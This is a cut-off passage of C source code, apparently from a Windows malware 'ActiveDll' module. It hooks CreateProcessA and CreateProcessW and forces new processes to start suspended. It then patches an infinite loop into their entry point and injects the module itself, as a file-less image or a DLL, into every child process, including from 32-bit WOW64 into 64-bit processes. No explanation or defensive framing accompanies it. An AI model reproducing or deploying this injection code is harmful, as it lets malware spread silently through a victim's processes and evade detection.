		if (!PsSupReadProcessMemoryArch(hProcess, (ModuleBase + pDataDir->VirtualAddress), &TlsDir, sizeof(IMAGE_TLS_DIRECTORY), &bRead))
			break;

		if (!TlsDir.AddressOfCallBacks)
			break;

		// Image has TLS callbacks
		if (!PsSupReadProcessMemoryArch(hProcess, (ULONGLONG)(ULONG_PTR)TlsDir.AddressOfCallBacks, Buffer, PAGE_SIZE, &bRead))
			break;

		if (TlsCallback = *(ULONGLONG*)Buffer)
			ProcessEntry = TlsCallback;

	} while(FALSE);

	*pProcessEntry = ProcessEntry;

	if (Buffer)
		AppFree(Buffer);

	return(ntStatus);
}


//
//	Injects a 64-bit native DLL into a 64-bit native process from a WOW64 process.
//
static	WINERROR Wow64ProcessInjectDll64(
	LPPROCESS_INFORMATION lpProcessInformation, 
	LPTSTR	DllPath,
	BOOL	bInjectImage	
	)
{
	WINERROR	Status = ERROR_UNSUCCESSFULL;
	ULONG		Orig, Patch = 0xCCCCFEEB;
	CONTEXT64	Ctx64 = {0};
	ULONG_PTR	bRead;
	ULONGLONG	Oep;
	PPSSUP_NATIVE_POINTERS	Wow64CallPointers = PsSupResolveNativePointers();

	Ctx64.ContextFlags = _CONTEXT_AMD64 | _CONTEXT_CONTROL | _CONTEXT_INTEGER;

	if (NT_SUCCESS(Wow64GetProcessEntry64(lpProcessInformation->hProcess, &Oep)))
	{
		// Saving original OEP bytes
		if (PsSupReadProcessMemoryArch(lpProcessInformation->hProcess, Oep, &Orig, sizeof(ULONG), &bRead) && bRead == sizeof(ULONG))
		{
			// Writing infinitive loop to OEP
			if (Wow64PatchProcessMemory64(lpProcessInformation->hProcess, Oep, (PCHAR)&Patch, sizeof(ULONG)))
			{
				LONG Count = PROCESS_WAIT_TIME;
				// Waiting for a main thread to initialize
				do
				{
					ResumeThread(lpProcessInformation->hThread);
					Sleep(PROCESS_CHECK_TIME);
					SuspendThread(lpProcessInformation->hThread);
					Count -= PROCESS_CHECK_TIME;

					if (!NT_SUCCESS(Wow64NativeCall(Wow64CallPointers->pZwGetContextThread, 2, (ULONG64)lpProcessInformation->hThread, (ULONG64)&Ctx64)))
						ASSERT(FALSE);

				} while((Count > 0) && (Ctx64.Rip != Oep));

				ASSERT(Ctx64.Rip == Oep);

				// The main thread seems to be initialized, injecting the dll into the process
				if (bInjectImage)
					Status = AdInjectImage(lpProcessInformation, 0);
				else
					Status = PsSupWow64InjectDll64(lpProcessInformation, DllPath);

				// Restoring OEP bytes
				Wow64PatchProcessMemory64(lpProcessInformation->hProcess, Oep, (PCHAR)&Orig, sizeof(ULONG));
			}	// if (Wow64PatchProcessMemory64(
		}	// if (PsSupReadProcessMemoryArch(
	}	// if (NT_SUCCESS(Wow64GetProcessEntry64(lpProcessInformation->hProcess, &Oep)))

	return(Status);
}

#endif	// #ifndef	_WIN64


//
//	Injects current DLL into the process described by lpProcessInformation structure.
//	We cannot just inject a DLL into the newly-creted process with main thread suspended. This is because the main thread
//	 suspends BEFORE the process initializes. Injecting a DLL will fail within LoadLibrary function.
//	So we have to make sure the process is completely initialized. To do that we put an infinitive loop into the processes OEP.
//	Then we resume the main thread and wait until it reaches OEP. There we inject a DLL, restore the OEP and resume the main thread.
//
WINERROR AcInjectDll(
	LPPROCESS_INFORMATION lpProcessInformation,	// Target process and it's main thread information
	DWORD	ProcessCreateFlags,					// Process creation flags	
	BOOL	bInjectImage						// specify TRUE if the DLL should be injected as image (without a file)
	)
{
	WINERROR Status = ERROR_UNSUCCESSFULL;
	CONTEXT	Ctx = {0};
	ULONG_PTR	bRead, Oep = 0;
	ULONG	Orig, Patch = 0xCCCCFEEB;
	HANDLE	hProcess = lpProcessInformation->hProcess;
	ULONG	InjectFlags = 0;
	LPTSTR	ArchPath = NULL, DllPath = g_CurrentModulePath;


	if (PsSupIsWow64Process(lpProcessInformation->dwProcessId, 0))
		InjectFlags = INJECT_WOW64_TARGET;

#ifndef _WIN64
	// Checking if we trying to inject a DLL from a WOW64 process into a native one
	if (!(InjectFlags & INJECT_WOW64_TARGET) && (g_CurrentProcessFlags & GF_WOW64_PROCESS))
	{
		if (bInjectImage || (ArchPath = PsSupNameChangeArch(g_CurrentModulePath)))
			Status = Wow64ProcessInjectDll64(lpProcessInformation, ArchPath, bInjectImage);
	}
	else
#endif
	{
		// Injecting DLL into the target process of the same architecture as current, 
		//	or into the WOW64 process from the 64-bit process
		Ctx.ContextFlags = CONTEXT_CONTROL | CONTEXT_INTEGER;
		Oep = GetProcessEntry(lpProcessInformation->hProcess, InjectFlags);

		// Saving original OEP bytes
		if (ReadProcessMemory(hProcess, (PVOID)Oep, &Orig, sizeof(ULONG), &bRead) && bRead == sizeof(ULONG))
		{
			// Writing infinitive loop to OEP
			if (PatchProcessMemory(hProcess, (PVOID)Oep, (PCHAR)&Patch, sizeof(ULONG)))
			{
				LONG Count = PROCESS_WAIT_TIME;
				Status = NO_ERROR;

				// Waiting for a main thread to initialize
				do
				{
					ResumeThread(lpProcessInformation->hThread);
					Sleep(PROCESS_CHECK_TIME);
					SuspendThread(lpProcessInformation->hThread);
					Count -= PROCESS_CHECK_TIME;
					if (!GetThreadContext(lpProcessInformation->hThread, &Ctx))
					{
						// Looks like the target process died while being initialized
						Status = ERROR_UNSUCCESSFULL;
						break;
					}
	
#ifdef	_WIN64
				} while((Count > 0) && (Ctx.Rip != Oep));

				if (Status == NO_ERROR)
				{
					ASSERT(Ctx.Rip == Oep);

					if ((InjectFlags & INJECT_WOW64_TARGET) && (ArchPath = PsSupNameChangeArch(DllPath)))
						DllPath = ArchPath;			

#else
				} while((Count > 0) && (Ctx.Eip != Oep));

				if (Status == NO_ERROR)
				{
					ASSERT(Ctx.Eip == Oep);
#endif
					// The main thread seems to be initialized, injecting the dll into the process
					if (bInjectImage)
						Status = AdInjectImage(lpProcessInformation, InjectFlags);
					else
						Status = PsSupInjectDllWithStub(lpProcessInformation, DllPath, InjectFlags);

					SwitchToThread();
					PatchProcessMemory(hProcess, (PVOID)Oep, (PCHAR)&Orig, sizeof(ULONG));
				}	// if (Status == NO_ERROR)
			}	// if (PatchProcessMemory(
		}	// if (ReadProcessMemory(
	}	// else

	if (Status == ERROR_UNSUCCESSFULL)
		Status = GetLastError();

	if (!(ProcessCreateFlags & CREATE_SUSPENDED))
		ResumeThread(lpProcessInformation->hThread);

	if (ArchPath)
		AppFree(ArchPath);

	if (Status != NO_ERROR)
	{
		DbgPrint("ActiveDll: Failed to Inject a DLL, error: %u\n", Status);
	}

	return(Status);
}

//
//	Sets Active DLL hooks. Currently CreateProcessA and CreateProcessW hooks are set.
//	Hooking kernel32 export first, and, then enumerating all loaded modules and hooking their IATs.
//	If the function succeeds, the return value is NO_ERROR. 
//	If the function fails, the return value is a nonzero error code defined in Winerror.h.
//
static INT ActiveDllSetHooks(VOID)
{
	LONG NumberIatHooks;
	LONG NumberExportHooks;
	PHOOK_DESCRIPTOR ExportHooks;
	PHOOK_DESCRIPTOR IatHooks;

	CHAR SystemMajor = LOBYTE(LOWORD(g_SystemVersion));
	CHAR SystemMinor = HIBYTE(LOWORD(g_SystemVersion));

	DbgPrint("ActiveDllSetHooks\n");

	if (SystemMajor > 6 || (SystemMajor == 6 && SystemMinor > 0))
	{
		// Windows 7 and higher
		ExportHooks = (PHOOK_DESCRIPTOR)&ProcExportHooksEx;
		IatHooks = (PHOOK_DESCRIPTOR)&ProcIatHooksEx;
		NumberExportHooks = sizeof(ProcExportHooksEx) / sizeof(HOOK_DESCRIPTOR);
		NumberIatHooks = sizeof(ProcIatHooksEx) / sizeof(HOOK_DESCRIPTOR);
	}
	else
	{
		// Windows Vista and lower
		ExportHooks = (PHOOK_DESCRIPTOR)&ProcExportHooks;
		IatHooks = (PHOOK_DESCRIPTOR)&ProcIatHooks;
		NumberExportHooks = sizeof(ProcExportHooks) / sizeof(HOOK_DESCRIPTOR);
		NumberIatHooks = sizeof(ProcIatHooks) / sizeof(HOOK_DESCRIPTOR);
	}

	return SetMultipleDllHooks(
		IatHooks,
		NumberIatHooks,
		ExportHooks,
		NumberExportHooks
		);
}

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	This thread attempts to inject current DLL into specified process in a loop.
//	The loop is required to wait until process initialization completes.
//
LONG WINAPI DllInjectThread(ULONG ProcessId)
{
	LONG Status;

	// ERROR_PARTIAL_COPY currently means that process's PEB is still paged out and we were unable
	//  to enumerate kernel32 base or to read or write process memory.
	while ((Status = PsSupInjectDll(ProcessId, g_CurrentModulePath, 0)) == ERROR_PARTIAL_COPY)
		Sleep(10);

	DbgPrint("ActiveDll: Dll inject thread for process 0x%x terminated with status: %u\n", ProcessId, Status);

	return(Status);
}


INT CreateInjectThread(ULONG ProcessId)
{
	INT Status = NO_ERROR;
	ULONG ThreadId;
	HANDLE hThread = CreateThread(NULL, 0x1000, (LPTHREAD_START_ROUTINE)&DllInjectThread,(PVOID)(ULONG_PTR)ProcessId, 0, &ThreadId);
	if (hThread)
		CloseHandle(hThread);
	else
		Status = GetLastError();

	return(Status);
}



// ---- Functions -----------------------------------------------------------------------------------------------------------

// Creates new process and injects dll in it
BOOL WINAPI AdCreateProcessA(
	PCHAR lpApplicationName,
	PCHAR lpCommandLine,
	LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	BOOL bInheritHandles,
	DWORD dwCreationFlags,
	LPVOID lpEnvironment,
	PCHAR lpCurrentDirectory,
	LPSTARTUPINFOA lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation
	)
{
	
	ULONG Flags = dwCreationFlags;
	BOOL Res = FALSE;
	ptr_CreateProcessA	pCreateProcessA;

	// Resolving real address of CreateProcessA function directly from the image file since the function could be hooked earlier.
	if (pCreateProcessA = PsSupGetRealFunctionAddress(GetModuleHandleW(wczKernel32), "CreateProcessA"))
	{
		dwCreationFlags |= CREATE_SUSPENDED;

		Res = (pCreateProcessA)(lpApplicationName, lpCommandLine,	lpProcessAttributes, lpThreadAttributes, bInheritHandles, 
			dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation);

		if (Res)
			AcInjectDll(lpProcessInformation, Flags, _INJECT_AS_IMAGE);
	}

	return(Res);
}

BOOL WINAPI CallCreateProcessA(
	PCHAR lpApplicationName,
	PCHAR lpCommandLine,
	LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	BOOL bInheritHandles,
	DWORD dwCreationFlags,
	LPVOID lpEnvironment,
	PCHAR lpCurrentDirectory,
	LPSTARTUPINFOA lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation
	)
{
	
	ULONG Flags = dwCreationFlags;
	BOOL Res;

	dwCreationFlags |= CREATE_SUSPENDED;

	Res = ((ptr_CreateProcessA)hook_kernel32_CreateProcessA.Original)(lpApplicationName, lpCommandLine,	lpProcessAttributes, lpThreadAttributes, bInheritHandles, 
		dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation);

	if (Res)
		AcInjectDll(lpProcessInformation, Flags, _INJECT_AS_IMAGE);

	return(Res);
}


BOOL WINAPI CallCreateProcessW(
	LPWSTR lpApplicationName,
	LPWSTR lpCommandLine,
	LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	BOOL bInheritHandles,
	DWORD dwCreationFlags,
	LPVOID lpEnvironment,
	LPWSTR lpCurrentDirectory,
	LPSTARTUPINFOW lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation
	)
{
	ULONG Flags = dwCreationFlags;
	BOOL Res;

	dwCreationFlags |= CREATE_SUSPENDED;

	ASSERT(hook_kernel32_CreateProcessW.Original);
	Res = ((ptr_CreateProcessW)hook_kernel32_CreateProcessW.Original)(lpApplicationName, lpCommandLine,	lpProcessAttributes, lpThreadAttributes, bInheritHandles, 
		dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation);

	if (Res)
		AcInjectDll(lpProcessInformation, Flags, _INJECT_AS_IMAGE);
	
	return(Res);
}


// ---- Active DLL startup/cleanup routines ------------------------------------------------------------------------------------

//
//	Initializes Active Dll engine and sets Active Dll hooks.
//	If the function succeeds, the return value is NO_ERROR. 
//	If the function fails, the return value is a nonzero error code defined in Winerror.h.
//
WINERROR AcStartup(
	PVOID	pContext,	// ActiveDll context pointer passed to the DLL when it is being injected as PE-image
	BOOL	bSetHooks	// Specify TRUE to set ActiveDLL hooks
	)
{
	WINERROR Status = NO_ERROR;

#if _INJECT_AS_IMAGE
	if (!pContext)
	{
		if ((Status = PsSupGetModulePath(g_CurrentModule, &g_CurrentModulePath)) == NO_ERROR)
		{
			PCHAR	ArchPath;

			if (ArchPath = PsSupNameChangeArch(g_CurrentModulePath))
			{
#ifdef _M_AMD64
				Status = PsSupLoadFile(g_CurrentModulePath, (PCHAR*)&g_CurrentAdContext.pModule64, &g_CurrentAdContext.Module64Size);
				if (Status == NO_ERROR)
					PsSupLoadFile(ArchPath, (PCHAR*)&g_CurrentAdContext.pModule32, &g_CurrentAdContext.Module32Size);
			
#else
				Status = PsSupLoadFile(g_CurrentModulePath, (PCHAR*)&g_CurrentAdContext.pModule32, &g_CurrentAdContext.Module32Size);
				if (Status == NO_ERROR)
					PsSupLoadFile(ArchPath, (PCHAR*)&g_CurrentAdContext.pModule64, &g_CurrentAdContext.Module64Size);
#endif
				AppFree(ArchPath);
			}	// if (ArchPath = PsSupNameChangeArch(g_CurrentModulePath))
		}	// if ((Status = PsSupGetModulePath(g_CurrentModule, &g_CurrentModulePath)) == NO_ERROR)
	}	// if (!pContext)
	else
		memcpy(&g_CurrentAdContext, pContext, sizeof(AD_CONTEXT));
#endif

	if (Status == NO_ERROR && bSetHooks){
		Status = ActiveDllSetHooks();
		if ( Status != NO_ERROR ){
			DbgPrint("ActiveDllSetHooks 2 failed status=%lu\n", Status);
		}
	}
	
	return(Status);
}



VOID AcCleanup(VOID)
{
	// We do not cleanup active dll hooks, because all of them are linked into the application g_HookList, and 
	//  will be removed together with all other hooks.

}